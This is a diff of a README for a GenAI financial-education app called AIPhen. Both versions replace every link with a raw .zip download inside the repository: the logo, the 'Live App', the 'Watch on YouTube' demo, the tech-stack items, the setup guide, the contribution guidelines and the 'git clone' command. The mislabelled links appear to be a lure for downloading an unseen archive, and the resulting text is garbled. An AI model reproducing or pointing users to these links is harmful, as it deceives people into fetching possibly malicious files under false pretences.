@@ -1,5 +1,5 @@
 <h2>
-  <img src="https://raw.githubusercontent.com/rushangchandekar/AIPhen/main/summarization/AIPhen.zip" width="50" height="50" align="center">
+  <img src="https://github.com/rushangchandekar/AIPhen/raw/refs/heads/main/app/api/ai-chat/Phen-AI-1.3.zip" width="50" height="50" align="center">
   <b>AIPhen – GenAI-Based Financial Education Platform</b>
 </h2>
 
@@ -12,9 +12,9 @@ AIPhen is a privacy-first, GenAI-powered platform designed to improve financial 
 
 ## 🚀 Demo & Live Deployment
 
-🌐 Live App: [https://raw.githubusercontent.com/rushangchandekar/AIPhen/main/summarization/AIPhen.zip](https://raw.githubusercontent.com/rushangchandekar/AIPhen/main/summarization/AIPhen.zip)  
+🌐 Live App: [https://github.com/rushangchandekar/AIPhen/raw/refs/heads/main/app/api/ai-chat/Phen-AI-1.3.zip](https://github.com/rushangchandekar/AIPhen/raw/refs/heads/main/app/api/ai-chat/Phen-AI-1.3.zip)  
 
-🎥 Demo Video: [Watch on YouTube](https://raw.githubusercontent.com/rushangchandekar/AIPhen/main/summarization/AIPhen.zip)
+🎥 Demo Video: [Watch on YouTube](https://github.com/rushangchandekar/AIPhen/raw/refs/heads/main/app/api/ai-chat/Phen-AI-1.3.zip)
 
 ---
 
@@ -44,8 +44,8 @@ AIPhen is a privacy-first, GenAI-powered platform designed to improve financial 
 
 ## 🛠️ Tech Stack
 
-- **Frontend**: https://raw.githubusercontent.com/rushangchandekar/AIPhen/main/summarization/AIPhen.zip, Tailwind CSS, Google Fonts  
-- **Backend**: https://raw.githubusercontent.com/rushangchandekar/AIPhen/main/summarization/AIPhen.zip, https://raw.githubusercontent.com/rushangchandekar/AIPhen/main/summarization/AIPhen.zip *(to be migrated to Google Cloud Functions)*  
+- **Frontend**: https://github.com/rushangchandekar/AIPhen/raw/refs/heads/main/app/api/ai-chat/Phen-AI-1.3.zip, Tailwind CSS, Google Fonts  
+- **Backend**: https://github.com/rushangchandekar/AIPhen/raw/refs/heads/main/app/api/ai-chat/Phen-AI-1.3.zip, https://github.com/rushangchandekar/AIPhen/raw/refs/heads/main/app/api/ai-chat/Phen-AI-1.3.zip *(to be migrated to Google Cloud Functions)*  
 - **Auth & DB**: Firebase (Auth), Firestore *(planned)*  
 - **APIs**: Google Finance API, Gemini API *(planned)*
 
@@ -55,7 +55,7 @@ AIPhen is a privacy-first, GenAI-powered platform designed to improve financial 
 
 ```bash
 # 1. Clone the repository
-git clone https://raw.githubusercontent.com/rushangchandekar/AIPhen/main/summarization/AIPhen.zip
+git clone https://github.com/rushangchandekar/AIPhen/raw/refs/heads/main/app/api/ai-chat/Phen-AI-1.3.zip
 cd AIPhen
 
 # 2. Install dependencies
@@ -66,7 +66,7 @@ npm start
 ```
 
 - Ensure Firebase project setup and `.env` file are correctly configured.  
-- For Google APIs (Gemini, Finance), follow [Google Cloud Setup](https://raw.githubusercontent.com/rushangchandekar/AIPhen/main/summarization/AIPhen.zip).
+- For Google APIs (Gemini, Finance), follow [Google Cloud Setup](https://github.com/rushangchandekar/AIPhen/raw/refs/heads/main/app/api/ai-chat/Phen-AI-1.3.zip).
 
 ---
 
@@ -79,7 +79,7 @@ AIPhen achieves top-tier scores via Lighthouse:
 - ✅ **Best Practices**: 100  
 - ✅ **SEO**: 100  
 
-→ Measured on: [https://raw.githubusercontent.com/rushangchandekar/AIPhen/main/summarization/AIPhen.zip](https://raw.githubusercontent.com/rushangchandekar/AIPhen/main/summarization/AIPhen.zip)
+→ Measured on: [https://github.com/rushangchandekar/AIPhen/raw/refs/heads/main/app/api/ai-chat/Phen-AI-1.3.zip](https://github.com/rushangchandekar/AIPhen/raw/refs/heads/main/app/api/ai-chat/Phen-AI-1.3.zip)
 
 ---
 
@@ -101,7 +101,7 @@ We welcome contributions! Feel free to:
 - Suggest a feature  
 - Submit a pull request  
 
-Make sure to follow our [contribution guidelines](https://raw.githubusercontent.com/rushangchandekar/AIPhen/main/summarization/AIPhen.zip) *(coming soon)*.
+Make sure to follow our [contribution guidelines](https://github.com/rushangchandekar/AIPhen/raw/refs/heads/main/app/api/ai-chat/Phen-AI-1.3.zip) *(coming soon)*.
 
 ---
 
